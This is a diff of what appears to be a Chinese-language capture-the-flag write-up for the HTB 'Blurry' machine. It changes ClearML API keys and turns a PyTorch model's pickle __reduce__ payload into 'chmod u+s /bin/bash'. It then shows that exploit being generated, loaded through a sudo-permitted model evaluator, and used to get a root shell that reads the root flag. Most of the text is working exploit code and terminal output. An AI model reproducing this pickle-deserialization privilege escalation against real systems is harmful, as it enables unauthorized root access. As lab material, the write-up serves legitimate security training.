@@ -73,8 +73,8 @@ api {
     api_server: http://api.blurry.htb
     files_server: http://files.blurry.htb
     credentials {
-        "access_key" = "AR4FO17G33P94TC9QZZ7"
-        "secret_key"  = "hwzVEXw76bdhsNgTadi7OgsJnTYyLcNYpLCkIFNpKr7oFSGal5"
+        "access_key" = "X2KEGNWGP9F0C3USSJTB"
+        "secret_key"  = "m3ZQSd0E8bYcSqeiQHZPH1anOJIWRU1QNLWeFsZVdNqsCu3iZ9"
     }
 }
 ```
@@ -328,8 +328,36 @@ class Net(nn.Module):
         return action
 
     def __reduce__(self):
-        return (os.system, ('ping 10.10.16.7 -c 4',))
+        return (os.system, ('chmod u+s /bin/bash',))
 if __name__ == '__main__':
     a = Net()
     torch.save(a, '12.pth')		
+```
+
+上面代码拿到机器上运行,生成12.pth文件
+```
+jippity@blurry:~$ python3 exp.py 
+jippity@blurry:~$ ls
+12.pth  automation  clearml.conf  exp.py  user.txt
+
+```
+
+执行sudo,拿到root
+```
+jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/12.pth
+[+] Model /models/12.pth is considered safe. Processing...
+Traceback (most recent call last):
+  File "/models/evaluate_model.py", line 76, in <module>
+    main(model_path)
+  File "/models/evaluate_model.py", line 65, in main
+    model = load_model(model_path)
+  File "/models/evaluate_model.py", line 33, in load_model
+    model.load_state_dict(state_dict)
+  File "/usr/local/lib/python3.9/dist-packages/torch/nn/modules/module.py", line 2104, in load_state_dict
+    raise TypeError(f"Expected state_dict to be dict-like, got {type(state_dict)}.")
+TypeError: Expected state_dict to be dict-like, got <class 'int'>.
+jippity@blurry:~$ bash -p
+bash-5.1# cat /root/root.txt
+cee60aa1d9d..
+bash-5.1# 
 ```
